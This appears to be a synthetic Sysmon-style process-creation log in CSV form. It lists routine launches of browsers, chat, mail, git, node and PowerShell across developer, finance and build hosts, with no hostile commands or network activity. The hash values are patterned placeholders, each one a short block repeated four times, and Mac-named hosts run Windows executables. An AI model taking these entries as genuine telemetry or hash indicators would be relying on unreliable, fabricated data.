UtcTime,Computer,User,EventID,Image,CommandLine,ParentImage,DestinationIp,DestinationPort,Hashes
2026-03-12 15:43:52.724,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004a01540d89c980004a01540d89c980004a01540d89c980004a01540d89c98
2026-03-12 15:57:53.645,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0020fbc4c70d9d1e0020fbc4c70d9d1e0020fbc4c70d9d1e0020fbc4c70d9d1e
2026-03-12 16:11:26.623,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000672b8d5e3afb0000672b8d5e3afb0000672b8d5e3afb0000672b8d5e3afb0
2026-03-12 16:20:51.228,FIN-WS22,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0000885035462bbe0000885035462bbe0000885035462bbe0000885035462bbe
2026-03-12 16:33:38.704,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00225da60ad587de00225da60ad587de00225da60ad587de00225da60ad587de
2026-03-12 16:45:26.347,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0005e81cbaa4af350005e81cbaa4af350005e81cbaa4af350005e81cbaa4af35
2026-03-12 16:56:22.309,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000f90297f334040000f90297f334040000f90297f334040000f90297f334040
2026-03-12 17:05:05.072,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=0014b76c695fb12f0014b76c695fb12f0014b76c695fb12f0014b76c695fb12f
2026-03-12 17:08:22.107,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001c0aa0b9eb6291001c0aa0b9eb6291001c0aa0b9eb6291001c0aa0b9eb6291
2026-03-12 17:14:47.201,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=00170f3395b5833000170f3395b5833000170f3395b5833000170f3395b58330
2026-03-12 17:21:03.938,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0007658a50506d330007658a50506d330007658a50506d330007658a50506d33
2026-03-12 17:27:21.917,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020ccb5933b44ea0020ccb5933b44ea0020ccb5933b44ea0020ccb5933b44ea
2026-03-12 17:33:12.711,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=00200929663e8b2200200929663e8b2200200929663e8b2200200929663e8b22
2026-03-12 17:45:59.445,MAC-DEV-04,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00158b0a5bdd4e5900158b0a5bdd4e5900158b0a5bdd4e5900158b0a5bdd4e59
2026-03-12 17:53:57.742,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00098461b89fb83c00098461b89fb83c00098461b89fb83c00098461b89fb83c
2026-03-12 17:59:16.267,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001e0387f370812a001e0387f370812a001e0387f370812a001e0387f370812a
2026-03-12 18:12:53.244,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=000df3f2772d4ec2000df3f2772d4ec2000df3f2772d4ec2000df3f2772d4ec2
2026-03-12 18:20:07.052,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000425ccb1709600000425ccb1709600000425ccb1709600000425ccb1709600
2026-03-12 18:23:33.018,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001f729bb4eebef5001f729bb4eebef5001f729bb4eebef5001f729bb4eebef5
2026-03-12 18:27:08.174,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=0001de92e10cc5880001de92e10cc5880001de92e10cc5880001de92e10cc588
2026-03-12 18:31:26.385,BLD-RUN-02,l.chen,1,git,"git",explorer.exe,,,SHA256=00221fabf534884000221fabf534884000221fabf534884000221fabf5348840
2026-03-12 18:45:44.202,FIN-WS31,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00185d70b01f828100185d70b01f828100185d70b01f828100185d70b01f8281
2026-03-12 18:54:10.924,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00197474f3c4835400197474f3c4835400197474f3c4835400197474f3c48354
2026-03-12 18:58:18.922,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00048919e6fe292200048919e6fe292200048919e6fe292200048919e6fe2922
2026-03-12 19:11:40.281,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0009b1a826c2b7160009b1a826c2b7160009b1a826c2b7160009b1a826c2b716
2026-03-12 19:18:04.900,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000b6d6e8ee1e184000b6d6e8ee1e184000b6d6e8ee1e184000b6d6e8ee1e184
2026-03-12 19:26:05.998,MAC-DEV-04,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00210e96d2645e5e00210e96d2645e5e00210e96d2645e5e00210e96d2645e5e
2026-03-12 19:33:09.183,MAC-DEV-04,n.byrd,1,node,"node",explorer.exe,,,SHA256=0017c805d37a45fb0017c805d37a45fb0017c805d37a45fb0017c805d37a45fb
2026-03-12 19:43:24.731,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=000b197aac3702c5000b197aac3702c5000b197aac3702c5000b197aac3702c5
2026-03-12 19:54:46.159,BLD-RUN-02,e.park,1,node,"node",explorer.exe,,,SHA256=0008ccb130f1fb800008ccb130f1fb800008ccb130f1fb800008ccb130f1fb80
2026-03-12 20:09:30.063,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0016a5ad06b0b1210016a5ad06b0b1210016a5ad06b0b1210016a5ad06b0b121
2026-03-12 20:16:40.590,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001eb708ec5b21a1001eb708ec5b21a1001eb708ec5b21a1001eb708ec5b21a1
2026-03-12 20:20:05.248,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000e91190940de60000e91190940de60000e91190940de60000e91190940de60
2026-03-12 20:29:13.204,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016e0ae4526a0850016e0ae4526a0850016e0ae4526a0850016e0ae4526a085
2026-03-12 20:34:43.241,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0021d9d5ee69a7de0021d9d5ee69a7de0021d9d5ee69a7de0021d9d5ee69a7de
2026-03-12 20:47:16.675,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002379bcab8bb712002379bcab8bb712002379bcab8bb712002379bcab8bb712
2026-03-12 20:57:17.183,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020adc897fd40660020adc897fd40660020adc897fd40660020adc897fd4066
2026-03-12 21:04:10.116,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0002095b61d210390002095b61d210390002095b61d210390002095b61d21039
2026-03-12 21:08:51.729,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0009aae5d0d1a3840009aae5d0d1a3840009aae5d0d1a3840009aae5d0d1a384
2026-03-12 21:14:54.087,FIN-WS31,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017f840e20fe5e30017f840e20fe5e30017f840e20fe5e30017f840e20fe5e3
2026-03-12 21:25:17.084,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001a4329b8b3a2d4001a4329b8b3a2d4001a4329b8b3a2d4001a4329b8b3a2d4
2026-03-12 21:36:54.367,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000d3122786ea122000d3122786ea122000d3122786ea122000d3122786ea122
2026-03-12 21:45:27.046,FIN-WS22,n.byrd,1,node,"node",explorer.exe,,,SHA256=0014d53c22961d640014d53c22961d640014d53c22961d640014d53c22961d64
2026-03-12 21:48:30.048,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ae61919adca99001ae61919adca99001ae61919adca99001ae61919adca99
2026-03-12 21:57:43.501,FIN-WS22,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00047df0e6213f7800047df0e6213f7800047df0e6213f7800047df0e6213f78
2026-03-12 22:05:08.682,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=0010e9b64cff4b260010e9b64cff4b260010e9b64cff4b260010e9b64cff4b26
2026-03-12 22:17:56.438,FIN-WS22,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002086fb42a01922002086fb42a01922002086fb42a01922002086fb42a01922
2026-03-12 22:31:46.980,MAC-DEV-17,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000ac49aad1ec459000ac49aad1ec459000ac49aad1ec459000ac49aad1ec459
2026-03-12 22:36:54.406,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001272aa371d3c89001272aa371d3c89001272aa371d3c89001272aa371d3c89
2026-03-12 22:47:38.659,FIN-WS31,e.park,1,git,"git",explorer.exe,,,SHA256=00010860cfa0794d00010860cfa0794d00010860cfa0794d00010860cfa0794d
2026-03-12 23:00:09.111,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006aebfd70d78e70006aebfd70d78e70006aebfd70d78e70006aebfd70d78e7
2026-03-12 23:09:30.230,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=002385ddd573abc8002385ddd573abc8002385ddd573abc8002385ddd573abc8
2026-03-12 23:18:23.420,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000aef418097bd76000aef418097bd76000aef418097bd76000aef418097bd76
2026-03-12 23:22:59.585,FIN-WS22,n.byrd,1,node,"node",explorer.exe,,,SHA256=0021a9eefb13c6d00021a9eefb13c6d00021a9eefb13c6d00021a9eefb13c6d0
2026-03-12 23:36:57.997,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=000528639564c7df000528639564c7df000528639564c7df000528639564c7df
2026-03-12 23:41:49.838,BLD-RUN-02,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001eff84fee8ff2a001eff84fee8ff2a001eff84fee8ff2a001eff84fee8ff2a
2026-03-12 23:55:52.039,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b27fa73350bfd001b27fa73350bfd001b27fa73350bfd001b27fa73350bfd
2026-03-13 00:07:10.899,FIN-WS22,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001291c915878b4d001291c915878b4d001291c915878b4d001291c915878b4d
2026-03-13 00:12:51.741,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000375064cc64ee1000375064cc64ee1000375064cc64ee1000375064cc64ee1
2026-03-13 00:19:32.298,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=0009db3e394107ce0009db3e394107ce0009db3e394107ce0009db3e394107ce
2026-03-13 00:25:30.046,FIN-WS31,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014c028f4924d7e0014c028f4924d7e0014c028f4924d7e0014c028f4924d7e
2026-03-13 00:39:51.721,MAC-DEV-17,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000a89ebe5695a59000a89ebe5695a59000a89ebe5695a59000a89ebe5695a59
2026-03-13 00:46:06.580,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0015bb018ea6876a0015bb018ea6876a0015bb018ea6876a0015bb018ea6876a
2026-03-13 01:00:03.218,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=000fe9e66e3f3cad000fe9e66e3f3cad000fe9e66e3f3cad000fe9e66e3f3cad
2026-03-13 01:03:11.287,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001a3b6f559c7890001a3b6f559c7890001a3b6f559c7890001a3b6f559c7890
2026-03-13 01:10:25.891,BLD-RUN-02,m.sato,1,node,"node",explorer.exe,,,SHA256=00034d1e058bda3a00034d1e058bda3a00034d1e058bda3a00034d1e058bda3a
2026-03-13 01:20:42.816,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001046e786ad40cf001046e786ad40cf001046e786ad40cf001046e786ad40cf
2026-03-13 01:27:36.849,MAC-DEV-04,l.chen,1,node,"node",explorer.exe,,,SHA256=0003cd9f8ea9664f0003cd9f8ea9664f0003cd9f8ea9664f0003cd9f8ea9664f
2026-03-13 01:34:27.010,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00152930bd697ed400152930bd697ed400152930bd697ed400152930bd697ed4
2026-03-13 01:40:19.965,FIN-WS31,n.byrd,1,node,"node",explorer.exe,,,SHA256=001ddd9cb28e95f5001ddd9cb28e95f5001ddd9cb28e95f5001ddd9cb28e95f5
2026-03-13 01:44:25.569,FIN-WS22,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000df1e0d7220bb1000df1e0d7220bb1000df1e0d7220bb1000df1e0d7220bb1
2026-03-13 01:56:03.405,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002073a3b0e847f0002073a3b0e847f0002073a3b0e847f0002073a3b0e847f0
2026-03-13 02:10:53.953,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001229d59395df08001229d59395df08001229d59395df08001229d59395df08
2026-03-13 02:19:12.592,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0002f656913eae840002f656913eae840002f656913eae840002f656913eae84
2026-03-13 02:29:24.492,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001577e821e3bfb3001577e821e3bfb3001577e821e3bfb3001577e821e3bfb3
2026-03-13 02:40:00.109,MAC-DEV-17,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ada0dc031d1e3001ada0dc031d1e3001ada0dc031d1e3001ada0dc031d1e3
2026-03-13 02:45:29.359,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=000c1a9cf77f135d000c1a9cf77f135d000c1a9cf77f135d000c1a9cf77f135d
2026-03-13 02:53:48.718,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000b209f40bb8f6b000b209f40bb8f6b000b209f40bb8f6b000b209f40bb8f6b
2026-03-13 03:08:22.139,BLD-RUN-02,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=002042f41c6f2f6a002042f41c6f2f6a002042f41c6f2f6a002042f41c6f2f6a
2026-03-13 03:19:26.911,MAC-DEV-04,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0005bf1d0bc521340005bf1d0bc521340005bf1d0bc521340005bf1d0bc52134
2026-03-13 03:25:00.117,MAC-DEV-04,a.velasquez,1,node,"node",explorer.exe,,,SHA256=00148c8c5974900c00148c8c5974900c00148c8c5974900c00148c8c5974900c
2026-03-13 03:29:47.049,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00127ea953690a6d00127ea953690a6d00127ea953690a6d00127ea953690a6d
2026-03-13 03:35:15.670,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=0000378dfc9c5e920000378dfc9c5e920000378dfc9c5e920000378dfc9c5e92
2026-03-13 03:46:02.807,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=000bf2b31d41d093000bf2b31d41d093000bf2b31d41d093000bf2b31d41d093
2026-03-13 03:56:28.208,BLD-RUN-02,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0002b27b3a1c46250002b27b3a1c46250002b27b3a1c46250002b27b3a1c4625
2026-03-13 04:07:44.216,MAC-DEV-17,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001556b0a7237e99001556b0a7237e99001556b0a7237e99001556b0a7237e99
2026-03-13 04:15:51.590,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=000e36870533ce88000e36870533ce88000e36870533ce88000e36870533ce88
2026-03-13 04:26:33.709,MAC-DEV-17,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00152dfe81f15e6f00152dfe81f15e6f00152dfe81f15e6f00152dfe81f15e6f
2026-03-13 04:34:29.654,MAC-DEV-04,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0013431cac47dea90013431cac47dea90013431cac47dea90013431cac47dea9
2026-03-13 04:48:14.076,MAC-DEV-04,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0011ff06bceaee8a0011ff06bceaee8a0011ff06bceaee8a0011ff06bceaee8a
2026-03-13 05:01:48.199,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001bbb8fab94b4f7001bbb8fab94b4f7001bbb8fab94b4f7001bbb8fab94b4f7
2026-03-13 05:14:17.788,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0007a22a7f86ac5f0007a22a7f86ac5f0007a22a7f86ac5f0007a22a7f86ac5f
2026-03-13 05:26:39.140,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0009eb20984c21da0009eb20984c21da0009eb20984c21da0009eb20984c21da
2026-03-13 05:33:35.586,FIN-WS22,t.owens,1,node,"node",explorer.exe,,,SHA256=000a53a9c64229ee000a53a9c64229ee000a53a9c64229ee000a53a9c64229ee
2026-03-13 05:37:55.441,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00228ce8310030cc00228ce8310030cc00228ce8310030cc00228ce8310030cc
2026-03-13 05:50:29.235,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002192225afedbc8002192225afedbc8002192225afedbc8002192225afedbc8
2026-03-13 05:56:27.516,FIN-WS31,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001e6a1741c53ed0001e6a1741c53ed0001e6a1741c53ed0001e6a1741c53ed0
2026-03-13 05:59:37.689,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=000f0f2aac286e46000f0f2aac286e46000f0f2aac286e46000f0f2aac286e46
2026-03-13 06:04:56.849,FIN-WS31,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001b2073f0e1d16d001b2073f0e1d16d001b2073f0e1d16d001b2073f0e1d16d
2026-03-13 06:12:56.385,MAC-DEV-04,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001a0384d5b90bbc001a0384d5b90bbc001a0384d5b90bbc001a0384d5b90bbc
2026-03-13 06:25:34.354,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=0017fb2458f0e74f0017fb2458f0e74f0017fb2458f0e74f0017fb2458f0e74f
2026-03-13 06:31:44.650,MAC-DEV-17,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0001347e100222ee0001347e100222ee0001347e100222ee0001347e100222ee
2026-03-13 06:39:53.261,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0006f0d49af804300006f0d49af804300006f0d49af804300006f0d49af80430
2026-03-13 06:48:25.123,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=000dcbfca929bc1f000dcbfca929bc1f000dcbfca929bc1f000dcbfca929bc1f
2026-03-13 07:03:12.750,FIN-WS31,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00166e97c02a73d600166e97c02a73d600166e97c02a73d600166e97c02a73d6
2026-03-13 07:09:00.280,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0021de89403f94600021de89403f94600021de89403f94600021de89403f9460
2026-03-13 07:12:43.011,MAC-DEV-17,l.chen,1,node,"node",explorer.exe,,,SHA256=000520693e663c08000520693e663c08000520693e663c08000520693e663c08
2026-03-13 07:16:33.532,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=00086951c091da0e00086951c091da0e00086951c091da0e00086951c091da0e
2026-03-13 07:20:58.562,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000b74bc459683f9000b74bc459683f9000b74bc459683f9000b74bc459683f9
2026-03-13 07:25:04.479,FIN-WS31,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00197e4bcca7d2b200197e4bcca7d2b200197e4bcca7d2b200197e4bcca7d2b2
2026-03-13 07:38:08.256,BLD-RUN-02,t.owens,1,node,"node",explorer.exe,,,SHA256=00099be4c728e77d00099be4c728e77d00099be4c728e77d00099be4c728e77d
2026-03-13 07:44:18.699,BLD-RUN-02,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0023754db2f6b9820023754db2f6b9820023754db2f6b9820023754db2f6b982
2026-03-13 07:49:31.268,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=0011fcf353e0cef30011fcf353e0cef30011fcf353e0cef30011fcf353e0cef3
2026-03-13 08:04:10.547,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=00201cfbc789176600201cfbc789176600201cfbc789176600201cfbc7891766
2026-03-13 08:13:32.161,FIN-WS31,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00178e72191c88de00178e72191c88de00178e72191c88de00178e72191c88de
2026-03-13 08:17:11.633,MAC-DEV-17,m.sato,1,git,"git",explorer.exe,,,SHA256=000f488291318033000f488291318033000f488291318033000f488291318033
2026-03-13 08:31:48.636,FIN-WS31,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001b325f6f841875001b325f6f841875001b325f6f841875001b325f6f841875
2026-03-13 08:35:26.694,FIN-WS31,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00100d2c7b07566500100d2c7b07566500100d2c7b07566500100d2c7b075665
2026-03-13 08:46:26.601,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b00c8e2ec84b7001b00c8e2ec84b7001b00c8e2ec84b7001b00c8e2ec84b7
2026-03-13 08:56:51.223,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00116087c233c5b900116087c233c5b900116087c233c5b900116087c233c5b9
2026-03-13 09:05:52.379,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014851a3d577dc30014851a3d577dc30014851a3d577dc30014851a3d577dc3
2026-03-13 09:14:20.177,FIN-WS31,n.byrd,1,node,"node",explorer.exe,,,SHA256=001e63ced7aade44001e63ced7aade44001e63ced7aade44001e63ced7aade44
2026-03-13 09:19:05.074,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000d2abdac797a86000d2abdac797a86000d2abdac797a86000d2abdac797a86
2026-03-13 09:25:43.177,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0000ea1bcd676cf80000ea1bcd676cf80000ea1bcd676cf80000ea1bcd676cf8
2026-03-13 09:40:17.009,FIN-WS31,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0008bd522e008f010008bd522e008f010008bd522e008f010008bd522e008f01
2026-03-13 09:52:57.526,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000d183da98f2bc8000d183da98f2bc8000d183da98f2bc8000d183da98f2bc8
2026-03-13 10:01:50.531,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001f2ff331f03bac001f2ff331f03bac001f2ff331f03bac001f2ff331f03bac
2026-03-13 10:10:44.881,BLD-RUN-02,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000a1a954233fabc000a1a954233fabc000a1a954233fabc000a1a954233fabc
2026-03-13 10:19:49.053,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=000e054d655be8c8000e054d655be8c8000e054d655be8c8000e054d655be8c8
2026-03-13 10:30:29.271,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=0015cbd4523054b00015cbd4523054b00015cbd4523054b00015cbd4523054b0
2026-03-13 10:43:42.780,MAC-DEV-17,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0021c645f9b6b4a00021c645f9b6b4a00021c645f9b6b4a00021c645f9b6b4a0
2026-03-13 10:53:32.109,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00198a6fb3f1eda100198a6fb3f1eda100198a6fb3f1eda100198a6fb3f1eda1
2026-03-13 11:04:58.825,BLD-RUN-02,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022c6f0f06041fe0022c6f0f06041fe0022c6f0f06041fe0022c6f0f06041fe
2026-03-13 11:08:02.621,MAC-DEV-17,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000846e3fcd4adaf000846e3fcd4adaf000846e3fcd4adaf000846e3fcd4adaf
2026-03-13 11:12:05.177,MAC-DEV-04,n.byrd,1,node,"node",explorer.exe,,,SHA256=000c2a45fa975c69000c2a45fa975c69000c2a45fa975c69000c2a45fa975c69
2026-03-13 11:21:18.529,MAC-DEV-17,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001fac7af42adb37001fac7af42adb37001fac7af42adb37001fac7af42adb37
2026-03-13 11:31:21.952,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00009435882f21e600009435882f21e600009435882f21e600009435882f21e6
2026-03-13 11:45:40.529,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=0010f5f1b3328fb90010f5f1b3328fb90010f5f1b3328fb90010f5f1b3328fb9
2026-03-13 11:54:25.279,FIN-WS31,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00157a21d9aafe4d00157a21d9aafe4d00157a21d9aafe4d00157a21d9aafe4d
2026-03-13 12:08:33.942,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0010b834d6dd56650010b834d6dd56650010b834d6dd56650010b834d6dd5665
2026-03-13 12:17:02.831,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=00116b433afeb27500116b433afeb27500116b433afeb27500116b433afeb275
2026-03-13 12:28:20.588,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ecd61cf736082001ecd61cf736082001ecd61cf736082001ecd61cf736082
2026-03-13 12:42:39.148,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001c2fa9d139f1c4001c2fa9d139f1c4001c2fa9d139f1c4001c2fa9d139f1c4
2026-03-13 12:50:22.183,FIN-WS31,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00150bfd35b6e30d00150bfd35b6e30d00150bfd35b6e30d00150bfd35b6e30d
